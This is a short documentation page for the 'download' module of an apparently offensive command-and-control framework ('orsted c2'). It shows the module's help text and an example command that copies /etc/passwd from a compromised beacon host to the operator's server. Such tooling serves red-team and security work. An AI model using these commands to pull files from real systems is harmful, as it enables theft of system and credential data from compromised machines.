---

title: download
description: orsted c2 download
---

### General

`download` allows you to download files.

```
[Session 9: haroun@DESKTOP-DU89UIV] » download --help

download file from beacon to the server

Usage:
  download [flags] remotefile localpath

Args:
  remotefile  string    remote file to download
  localpath   string    local destination on the server

Flags:
  -h, --help     display help
```

It requires you to load the `download` SO with `load-module download`.

Example:

```powershell
[Session 9: haroun@DESKTOP-DU89UIV] » download /etc/passwd /tmp/host_passwd
```

This will download the remote file `/etc/passwd` to the `/tmp/host_passwd` of the `orsted-server` (not the `orsted-client`)
